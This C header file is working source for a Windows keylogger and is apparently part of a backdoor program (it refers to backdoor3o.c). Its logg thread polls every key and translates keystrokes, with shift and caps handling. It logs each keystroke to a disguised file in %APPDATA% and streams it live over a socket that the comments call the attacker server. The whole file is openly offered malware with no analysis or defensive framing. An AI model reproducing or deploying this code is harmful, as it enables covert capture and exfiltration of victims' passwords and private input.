#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <windows.h>
#include <stdio.h>

/* ── Shared send lock ────────────────────────────────────────────────
   Defined in backdoor3o.c.  Prevents keylog sends from interleaving
   with binary data (screenshot / download) on the same socket.       */
extern CRITICAL_SECTION g_send_cs;
extern volatile LONG    g_keylog_paused;

DWORD WINAPI logg(void* param);  // param will be the socket

DWORD WINAPI logg(void* param) {
    SOCKET sock = (SOCKET)param;   // socket passed from main thread

    // Reliable log file path in %APPDATA% (always writable)
    char KEY_LOG_FILE[MAX_PATH] = {0};
    char appdata[MAX_PATH] = {0};
    GetEnvironmentVariableA("APPDATA", appdata, MAX_PATH);
    sprintf(KEY_LOG_FILE, "%s\\windows_log.txt", appdata);

    int vkey, last_key_state[0xFF];
    int isCAPSLOCK, isNUMLOCK;
    int isL_SHIFT, isR_SHIFT;
    int isPressed;
    char showKey;
    char NUMCHAR[] = ")!@#$%^&*(";
    char chars_vn[] = ";=,-./`";
    char chars_vs[] = ":+<_>?~";
    char chars_va[] = "[\\]';";
    char chars_vb[] = "{|}\"";

    for (vkey = 0; vkey < 0xFF; vkey++) {
        last_key_state[vkey] = 0;
    }

    while (1) {
        Sleep(10);

        /* If paused (binary transfer in progress), just sleep */
        if (g_keylog_paused) {
            Sleep(50);
            continue;
        }

        isCAPSLOCK = (GetKeyState(0x14) & 0xFF) > 0 ? 1 : 0;
        isNUMLOCK   = (GetKeyState(0x90) & 0xFF) > 0 ? 1 : 0;
        isL_SHIFT   = (GetKeyState(0xA0) & 0xFF00) > 0 ? 1 : 0;
        isR_SHIFT   = (GetKeyState(0xA1) & 0xFF00) > 0 ? 1 : 0;

        for (vkey = 0; vkey < 0xFF; vkey++) {
            isPressed = (GetKeyState(vkey) & 0xFF00) > 0 ? 1 : 0;
            showKey = (char)vkey;

            if (isPressed == 1 && last_key_state[vkey] == 0) {

                // === ORIGINAL KEY MAPPING LOGIC ===
                if (vkey >= 0x41 && vkey <= 0x5A) {
                    if (isCAPSLOCK == 0) {
                        if (isL_SHIFT == 0 && isR_SHIFT == 0) {
                            showKey = (char)(vkey + 0x20);
                        }
                    } else if (isL_SHIFT == 1 || isR_SHIFT == 1) {
                        showKey = (char)(vkey + 0x20);
                    }
                } else if (vkey >= 0x30 && vkey <= 0x39) {
                    if (isL_SHIFT == 1 || isR_SHIFT == 1) {
                        showKey = NUMCHAR[vkey - 0x30];
                    }
                } else if (vkey >= 0x60 && vkey <= 0x69 && isNUMLOCK == 1) {
                    showKey = (char)(vkey - 0x30);
                } else if (vkey >= 0xBA && vkey <= 0xC0) {
                    if (isL_SHIFT == 1 || isR_SHIFT == 1) {
                        showKey = chars_vs[vkey - 0xBA];
                    } else {
                        showKey = chars_vn[vkey - 0xBA];
                    }
                } else if (vkey >= 0xDB && vkey <= 0xDF) {
                    if (isL_SHIFT == 1 || isR_SHIFT == 1) {
                        showKey = chars_vb[vkey - 0xDB];
                    } else {
                        showKey = chars_va[vkey - 0xDB];
                    }
                } else if (vkey == 0x0D) {
                    showKey = (char)0x0A;   // Enter becomes newline
                } else if (vkey >= 0x6A && vkey <= 0x6F) {
                    showKey = (char)(vkey - 0x40);
                } else if (vkey != 0x20 && vkey != 0x09) {
                    showKey = (char)0x00;
                }

                if (showKey != (char)0x00) {
                    // 1. Save to local file (backup)
                    FILE *kh = fopen(KEY_LOG_FILE, "a");
                    if (kh) {
                        putc(showKey, kh);
                        fclose(kh);
                    }

                    // 2. Send LIVE to attacker server (lock-protected)
                    char sendbuf[128] = {0};
                    sprintf(sendbuf, "[KEYLOG] %c", showKey);
                    if (showKey == '\n') strcat(sendbuf, " [ENTER]");
                    strcat(sendbuf, "\n");

                    EnterCriticalSection(&g_send_cs);
                    send(sock, sendbuf, strlen(sendbuf), 0);
                    LeaveCriticalSection(&g_send_cs);
                }
            }
            last_key_state[vkey] = isPressed;
        }
    }
    return 0;
}

#endif // KEYLOGGER_H
